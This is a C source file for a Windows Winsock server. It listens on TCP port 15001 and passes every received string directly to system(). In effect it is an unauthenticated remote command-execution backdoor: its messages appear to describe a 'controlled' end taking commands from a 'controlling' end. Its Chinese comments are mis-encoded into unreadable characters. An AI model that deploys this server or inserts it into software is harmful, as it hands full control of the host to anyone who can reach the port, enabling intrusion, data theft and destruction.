
#include <stdio.h>
#include <winsock2.h>
#define PORT 15001					//ͨ�ŵĶ˿ڣ�ָ�������ˣ�
#define ERROR 0
#define size 1024			//ע�⣺��Server�����ݽ��ջ����� >= Client�����ݷ��ͻ����� ��������ɻ��������


int main()
{
    int i=0;
	WSADATA WSAData;
	if(WSAStartup(MAKEWORD(2,0),&WSAData)==SOCKET_ERROR)  //����winsock ��WSAStartup()������Winsock DLL���г�ʼ��
	{
		printf("Socket initialize fail!\n");
		exit(1);
	}
	SOCKET sock;										//������̴����׽��־�������ڼ�����
	if((sock=socket(AF_INET,SOCK_STREAM,0))==ERROR)		//����socket()��������һ�����׽��֣������������ַ���ͣ��׽������ͣ�����Э�飩
	{
		printf("Socket create!\n");
		WSACleanup();
		exit(1);
	}
	struct sockaddr_in localaddr;			//sockaddr_in�ṹ������ʶTCP/IPЭ���µĵ�ַ����ǿ��ת��Ϊsockaddr�ṹ
	localaddr.sin_family=AF_INET;			//sin_family�ֶα�����ΪAF_INET����ʾ��Socket����Internet��
	localaddr.sin_port=htons(PORT);		//sin_port�ֶ�����ָ������˿ڣ�ע������ͻ
	localaddr.sin_addr.s_addr=INADDR_ANY;  //sin_addr�ֶ����ڰ�һ��IP��ַ����Ϊһ��4�ֽڵ������޷��ų����ͣ����ݲ�ͬ�÷����ɱ�ʾ���ػ�Զ��IP��ַ
	if(bind(sock,(LPSOCKADDR)&localaddr,sizeof(localaddr))==SOCKET_ERROR)  //����bind()���������ص�ַ�󶨵����������׽����ϣ����������ϱ�ʶ���׽���
	{
		printf("Bind fail!\n");
		closesocket(sock);
		WSACleanup();
		exit(1);
	}
	printf("Server Socket Port:%d\n",ntohs(localaddr.sin_port));
	if(listen(sock,10)==SOCKET_ERROR)		//����listen()�������׽����������ģʽ��׼�������������󣬲�����������δ���ӵ��׽��������֣����ڵȴ����ӵ������г��ȣ�
	{
		printf("Listen fail!\n");
		closesocket(sock);
		WSACleanup();
		exit(1);
	}
	SOCKET msgsock;			//����һ���µ��׽��֣����ڽ���accept�����ķ���ֵ������ʾ�Ѿ����ܵ��Ǹ��ͻ��˵����ӣ���������Client���������ݣ�
	struct sockaddr_in remoteAddr;
    int nAddrlen = sizeof(remoteAddr);
	char buf[size];  //���ݽ��ջ�����
	while(1)
	{
		if((msgsock=accept(sock,(SOCKADDR *)&remoteAddr, &nAddrlen))==INVALID_SOCKET)  //�������״̬�󣬵���accept()�������տͻ��˵��������󣬲������Ӵ���msgsock�׽��֣�ԭsock�׽��ּ������������ͻ�����������
		{
			printf("Accept fail!\n");
			continue;
		}
		i++;
		if(i<2)
        {
            printf("���ƶ����ӳɹ���%s\n�ȴ����ƶ˷���ָ��\n",inet_ntoa(remoteAddr.sin_addr));
        }
		memset(buf,0,sizeof(buf));											//��ʼ�����ݽ��ջ�����
		recv(msgsock,buf,size,0);									//���տͻ��˷��͹���������
		if(buf[0]=='e' && buf[1]=='x' && buf[2]=='i' && buf[3]=='t')		//"exit"����˳�����
		{
			printf("The End.\n");
			break;
		}
		printf("ִ�п��ƶ�����>>>%s\n",buf);
		system(buf);						//�������пͻ��˴����������һ��̫�����ˣ����紫һ��Format����Ƿ���˿��ܾͻ���
		closesocket(msgsock);
	}
	closesocket(sock); //�ر��׽���
	WSACleanup();	   //��ֹ��Winsock DLL��ʹ�ã����ͷ���Դ
	return 0;
}
